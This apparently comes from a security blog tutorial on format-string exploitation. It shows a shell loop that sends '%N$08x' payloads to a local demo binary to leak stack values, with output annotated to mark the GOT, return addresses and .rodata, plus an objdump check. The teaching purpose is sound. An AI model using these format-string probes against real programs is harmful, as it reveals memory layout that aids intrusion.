---
layout: post
comments: true
title: "Pratical approach to exploitation: information leaking"
tags: [security, exploit]
---

we obtain the contents of the stack (each line corresponds to an increasing address)

```
$ for i in {1..30}; do echo -n "[$i] ";python -c 'print "AAAA" + "%'$i'$08x"' | public/code/simplest_excalation ;done
[1] What's your name? hello, AAAA00000000
[2] What's your name? hello, AAAAffcf2ae8
[3] What's your name? hello, AAAA080491b2 <--- after call __x86.get_pc_thunk.bx in greetings()
[4] What's your name? hello, AAAA41414141 <--- start of the input string
[5] What's your name? hello, AAAA30243525 <--- input string
[6] What's your name? hello, AAAAff007838
[7] What's your name? hello, AAAAf7d94830
[8] What's your name? hello, AAAA0804c000 <--- GOT
[9] What's your name? hello, AAAAf7fd2940
[10] What's your name? hello, AAAAf7d3c835
[11] What's your name? hello, AAAA08049225 <--- return pc to greetings()
[12] What's your name? hello, AAAA0804a010 <--- .rodata address
[13] What's your name? hello, AAAA0804c000 <--- .got.plt (start of the GOT)
[14] What's your name? hello, AAAAfff1e418
[15] What's your name? hello, AAAA0804922d <--- return pc to main()
[16] What's your name? hello, AAAAffd077f0
[17] What's your name? hello, AAAA00000000
[18] What's your name? hello, AAAA00000000
[19] What's your name? hello, AAAAf7cb89a1
[20] What's your name? hello, AAAAf7eec000
[21] What's your name? hello, AAAAf7f28000
[22] What's your name? hello, AAAA00000000
[23] What's your name? hello, AAAAf7d849a1
[24] What's your name? hello, AAAA00000001
[25] What's your name? hello, AAAAffaa3ab4
[26] What's your name? hello, AAAAffd39c9c
[27] What's your name? hello, AAAAff92d204
[28] What's your name? hello, AAAA00000001
[29] What's your name? hello, AAAA00000000
[30] What's your name? hello, AAAAf7f11000
```

take in mind that some variables are from previous, already, executed frame: to double check
that you can increase the input string length to see what's overwritten.

```
$ objdump -d public/code/simplest_excalation -j .text  | grep -B 1 8049225
 8049220:       e8 1b fe ff ff          call   8049040 <printf@plt>
 8049225:       83 c4 10                add    $0x10,%esp
```
